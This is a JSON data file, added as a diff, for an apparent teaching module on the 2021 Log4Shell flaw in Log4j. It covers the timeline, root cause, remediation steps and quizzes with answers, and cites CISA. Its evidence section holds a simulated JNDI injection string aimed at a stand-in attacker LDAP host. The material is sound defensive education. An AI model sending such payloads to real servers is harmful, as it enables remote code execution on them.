@@ -1,0 +1,423 @@
+{
+ "id": "log4shell",
+ "checked": "29 October 2026",
+ "summary": "In December 2021 a flaw in the Java logging library Log4j let attackers run code on servers by getting a crafted string written to a log. Fixing it took several releases because the first fixes were incomplete.",
+ "overview": {
+  "background": "Log4j is a very widely used Java logging library. Versions 2.0-beta9 to 2.14.1 supported lookups through JNDI, which could load remote content when a message was logged.",
+  "systems": [
+   "Log4j 2 library inside applications",
+   "Any service that logs user-controlled text",
+   "Outbound LDAP, RMI and DNS paths"
+  ],
+  "impact": "CISA describes CVE-2021-44228 as a remote code execution flaw in the JNDI lookup, with exploitation seen on or around 1 December 2021 and disclosure on 10 December 2021.",
+  "severity": "Critical. It affected a very large number of products, and follow-up flaws CVE-2021-45046 and CVE-2021-45105 appeared within days.",
+  "gaps": "The CISA advisory does not give the exact attack string, so the string shown here is labelled Simulated. Case counts are not given."
+ },
+ "archNote": "The data path shown is the general mechanism described by CISA. Specific products and layouts vary.",
+ "diagrams": [
+  {
+   "id": "before",
+   "section": "arch",
+   "kind": "conceptual",
+   "title": "How a log line became remote code execution",
+   "caption": "A conceptual path based on the CISA description: user input is logged, the library resolves a JNDI lookup, and remote content is loaded.",
+   "nodes": [
+    {
+     "id": "req",
+     "label": "Request with attacker text in a header or field",
+     "row": 0,
+     "col": 1
+    },
+    {
+     "id": "app",
+     "label": "Application logs the text",
+     "row": 1,
+     "col": 1,
+     "state": "hit"
+    },
+    {
+     "id": "lib",
+     "label": "Log4j 2.0-beta9 to 2.14.1 performs JNDI lookup",
+     "row": 2,
+     "col": 1,
+     "state": "fail"
+    },
+    {
+     "id": "ldap",
+     "label": "Attacker-controlled LDAP or RMI server",
+     "row": 3,
+     "col": 2,
+     "state": "fail"
+    },
+    {
+     "id": "code",
+     "label": "Remote code runs on the server",
+     "row": 3,
+     "col": 0,
+     "state": "fail"
+    }
+   ],
+   "edges": [
+    {
+     "f": "req",
+     "t": "app"
+    },
+    {
+     "f": "app",
+     "t": "lib",
+     "label": "message formatting",
+     "state": "fail"
+    },
+    {
+     "f": "lib",
+     "t": "ldap",
+     "label": "outbound lookup",
+     "state": "fail"
+    },
+    {
+     "f": "ldap",
+     "t": "code",
+     "label": "response",
+     "state": "fail"
+    }
+   ]
+  },
+  {
+   "id": "after",
+   "section": "after",
+   "kind": "conceptual",
+   "title": "Layers that cut the blast radius (conceptual)",
+   "caption": "Upgrading is the real fix. These layers reduce harm while upgrades roll out or if the next library flaw appears.",
+   "nodes": [
+    {
+     "id": "sbom",
+     "label": "Inventory of every library and version",
+     "row": 0,
+     "col": 1,
+     "state": "new"
+    },
+    {
+     "id": "up",
+     "label": "Patched Log4j 2.17.0 or later",
+     "row": 1,
+     "col": 1,
+     "state": "new"
+    },
+    {
+     "id": "egress",
+     "label": "Egress filtering blocks LDAP, RMI, DNS to the internet",
+     "row": 2,
+     "col": 0,
+     "state": "new"
+    },
+    {
+     "id": "least",
+     "label": "Least privilege runtime",
+     "row": 2,
+     "col": 2,
+     "state": "new"
+    },
+    {
+     "id": "mon",
+     "label": "Alerts on unexpected outbound connections",
+     "row": 3,
+     "col": 1,
+     "state": "new"
+    }
+   ],
+   "edges": [
+    {
+     "f": "sbom",
+     "t": "up",
+     "state": "new"
+    },
+    {
+     "f": "up",
+     "t": "egress",
+     "state": "new"
+    },
+    {
+     "f": "up",
+     "t": "least",
+     "state": "new"
+    },
+    {
+     "f": "egress",
+     "t": "mon",
+     "state": "new"
+    }
+   ]
+  }
+ ],
+ "afterChanges": [
+  "Know which services contain the library within minutes.",
+  "A blocked outbound path stops the second stage of the attack.",
+  "A low-privilege process limits what injected code can do."
+ ],
+ "afterNote": "Defence in depth means a library flaw is slowed at three more places.",
+ "timelineNote": "Dates are from the CISA advisory. No hourly times are given.",
+ "timeline": [
+  {
+   "t": "On or around 1 December 2021",
+   "phase": "trigger",
+   "e": "CISA reports exploitation of CVE-2021-44228 in the wild."
+  },
+  {
+   "t": "10 December 2021",
+   "phase": "detect",
+   "e": "CVE-2021-44228 is publicly disclosed."
+  },
+  {
+   "t": "After disclosure",
+   "phase": "mitigate",
+   "e": "Organisations upgrade, remove the JndiLookup class, hotpatch or block outbound LDAP, RMI and DNS."
+  },
+  {
+   "t": "13 December 2021",
+   "phase": "change",
+   "e": "CVE-2021-45046 is published and Log4j 2.16.0 is released because the first fix was incomplete in some settings."
+  },
+  {
+   "t": "16 and 17 December 2021",
+   "phase": "change",
+   "e": "CVE-2021-45105 is published and 2.17.0 is released."
+  },
+  {
+   "t": "21 December 2021",
+   "phase": "recover",
+   "e": "Version 2.12.3 is released for Java 7 users."
+  },
+  {
+   "t": "22 December 2021",
+   "phase": "recover",
+   "e": "CISA publishes the first version of advisory AA21-356A."
+  }
+ ],
+ "rootCause": {
+  "trigger": "Attacker-controlled text reached a log call in an application using an affected Log4j 2 version.",
+  "underlying": "The library resolved lookups inside message text, including a JNDI lookup that could load content from a remote server.",
+  "contributing": [
+   "Log4j is embedded in a vast number of products and often hidden inside other software",
+   "Many teams could not quickly tell which services used the library",
+   "Outbound traffic from servers was often unrestricted",
+   "The first fixes did not cover every configuration"
+  ],
+  "propagation": [
+   "Text is logged.",
+   "The lookup contacts an outside server.",
+   "The server returns something that is loaded.",
+   "Code runs with the application's privileges."
+  ]
+ },
+ "evidence": [
+  {
+   "label": "What the advisory says about the flaw",
+   "kind": "quoted",
+   "lang": "text",
+   "body": "CVE-2021-44228",
+   "note": "CISA names this CVE as the original flaw and gives the affected range as 2.0-beta9 to 2.14.1."
+  },
+  {
+   "label": "A simulated probe string",
+   "kind": "simulated",
+   "lang": "text",
+   "body": "GET /login HTTP/1.1\nUser-Agent: ${jndi:ldap://attacker.example/a}",
+   "note": "A teaching example of the type of text defenders searched for. The advisory does not publish a specific string, and this one points to a non-real host."
+  },
+  {
+   "label": "A simulated search for the library",
+   "kind": "simulated",
+   "lang": "bash",
+   "body": "$ find / -name 'log4j-core-*.jar' 2>/dev/null\n/opt/app/lib/log4j-core-2.14.1.jar\n/opt/search/lib/log4j-core-2.11.0.jar",
+   "note": "Shows how to find copies of the library. Paths are invented. Libraries can also be nested inside other archives."
+  }
+ ],
+ "fix": {
+  "simulated": true,
+  "diagnose": [
+   {
+    "step": "List every copy of the library, including those inside other archives.",
+    "why": "You cannot fix what you cannot find.",
+    "cmd": "find / -name 'log4j-core-*.jar' 2>/dev/null"
+   },
+   {
+    "step": "Check your dependency tree or software inventory.",
+    "why": "Transitive dependencies hide the library.",
+    "cmd": "mvn dependency:tree | grep -i log4j"
+   },
+   {
+    "step": "Search logs for outbound lookup patterns and unexpected outbound connections.",
+    "why": "This shows whether exploitation was attempted."
+   }
+  ],
+  "correct": [
+   {
+    "step": "Upgrade Log4j to the fixed release for your Java version.",
+    "why": "CISA's primary mitigation is upgrading the library itself."
+   },
+   {
+    "step": "If you cannot upgrade at once, remove the JndiLookup class from the jar as a temporary measure.",
+    "why": "CISA lists this as a temporary step.",
+    "cmd": "zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class"
+   },
+   {
+    "step": "Block outbound LDAP, RMI and DNS from servers that do not need them.",
+    "why": "Stops the second stage of the attack."
+   }
+  ],
+  "verify": [
+   {
+    "step": "Re-scan for vulnerable versions.",
+    "why": "Confirm no copy remains."
+   },
+   {
+    "step": "Restart services and test that they still start.",
+    "why": "Removing a class or changing a version can break startup."
+   }
+  ],
+  "prevent": [
+   {
+    "step": "Maintain a software bill of materials.",
+    "why": "Reduces time to find affected products."
+   },
+   {
+    "step": "Restrict egress by default.",
+    "why": "Blocks many exploitation paths."
+   },
+   {
+    "step": "Run services with the least privilege.",
+    "why": "Limits what injected code can do."
+   }
+  ],
+  "safety": "Edit jars only on a copy and keep a backup. Changing libraries in production needs testing. The temporary class removal does not replace the upgrade, and later CVEs show the first fix was not enough."
+ },
+ "activities": {
+  "troubleshoot": {
+   "scenario": "A critical library flaw is announced on a Friday. You run 300 services and do not know which ones use it.",
+   "clues": [
+    "Some services bundle jars inside other archives",
+    "Servers can reach the internet",
+    "A vendor product may include the library"
+   ],
+   "question": "What is your first-day plan?",
+   "hints": [
+    "Find first, fix second",
+    "Which network control buys time?",
+    "What about vendors?"
+   ],
+   "answer": "Build an inventory by scanning for the library and reading dependency trees, block outbound lookups, patch internet-facing systems first, ask vendors for statements, and monitor for exploitation attempts."
+  },
+  "rootcause": {
+   "q": "What was the technical cause?",
+   "options": [
+    "A weak password",
+    "A lookup feature that resolved remote JNDI content from logged text",
+    "An expired certificate",
+    "A memory leak"
+   ],
+   "answer": 1,
+   "why": "CISA describes a JNDI lookup remote code execution flaw."
+  },
+  "remediation": [
+   {
+    "task": "Write the order in which you patch.",
+    "answer": "Internet-facing services first, then services holding sensitive data, then internal tools, with a rescan after each wave."
+   },
+   {
+    "task": "Explain why the first fix was not enough.",
+    "answer": "Two later CVEs were published within days, so teams that stopped at 2.15.0 were left exposed."
+   },
+   {
+    "task": "Design an egress rule set.",
+    "answer": "Deny outbound by default, allow named destinations, and alert on blocked LDAP, RMI and DNS attempts."
+   }
+  ],
+  "design": {
+   "prompt": "Design how your organisation can answer 'where do we use library X?' within an hour.",
+   "constraints": [
+    "Hundreds of services",
+    "Vendor software included",
+    "Containers and virtual machines"
+   ],
+   "answer": "Generate a software bill of materials for each build, store it in a searchable index, scan running containers and hosts, and keep a vendor inventory. Add a runbook that uses the index first."
+  },
+  "checks": [
+   {
+    "q": "Which versions did CISA list as affected by CVE-2021-44228?",
+    "options": [
+     "1.x only",
+     "2.0-beta9 to 2.14.1",
+     "Only 2.17",
+     "All versions"
+    ],
+    "answer": 1,
+    "why": "That is the range in the advisory."
+   },
+   {
+    "q": "What is the primary mitigation?",
+    "options": [
+     "Restart the server",
+     "Upgrade Log4j",
+     "Disable logging",
+     "Change the password"
+    ],
+    "answer": 1,
+    "why": "CISA says to upgrade the library itself."
+   },
+   {
+    "q": "Why block outbound LDAP and RMI?",
+    "options": [
+     "They are slow",
+     "The attack needs the server to contact an outside server",
+     "They use too much bandwidth",
+     "They are encrypted"
+    ],
+    "answer": 1,
+    "why": "Blocking prevents the second stage of the exploit chain."
+   },
+   {
+    "q": "Why did more fixes follow the first?",
+    "options": [
+     "Release schedules",
+     "The first fix was incomplete in some configurations",
+     "A marketing plan",
+     "A change of vendor"
+    ],
+    "answer": 1,
+    "why": "CVE-2021-45046 and CVE-2021-45105 followed within days."
+   }
+  ]
+ },
+ "lessons": {
+  "preventive": [
+   "Keep a software bill of materials",
+   "Restrict egress",
+   "Do not resolve lookups in untrusted text"
+  ],
+  "monitoring": [
+   "Alert on unexpected outbound connections",
+   "Scan continuously for vulnerable versions"
+  ],
+  "recovery": [
+   "Patch internet-facing systems first",
+   "Rescan after each wave"
+  ],
+  "practices": [
+   "Track vendor statements",
+   "Expect follow-up fixes and plan for more than one patch cycle"
+  ]
+ },
+ "sources": [
+  {
+   "title": "CISA Advisory AA21-356A: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities",
+   "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-356a",
+   "used": "dates, versions, mitigations"
+  },
+  {
+   "title": "CISA Apache Log4j vulnerability guidance",
+   "url": "https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance",
+   "used": "background"
+  }
+ ],
+ "verification": "Dates and versions were read from the CISA advisory on 29 October 2026. The advisory does not list an attack string, so the probe string and file listings are Simulated, and the architecture diagram is Conceptual."
+}
